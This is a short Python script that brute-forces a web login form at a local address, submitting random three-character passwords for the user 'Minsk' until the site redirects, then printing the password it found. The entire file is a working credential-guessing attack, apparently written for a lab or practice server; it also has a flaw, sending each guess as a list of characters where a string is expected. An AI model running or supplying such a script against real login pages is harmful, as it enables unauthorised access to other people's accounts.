import requests, random, string

passwords = []

def main():
    url = "http://192.168.0.126:5000/"
    data = {
        "log_in": "log_in",
        "username": "Minsk",
        "password": ""
    }

    while True:
        password = random.choices(string.ascii_letters + string.digits, k=3)

        if password in passwords:
            continue
        else:
            passwords.append(password)

        data["password"] = password
        r = requests.post(url, data=data)

        if r.url != url:
            print(f"password: {password}\n {r.url}")
            break

if __name__ == "__main__":
    main()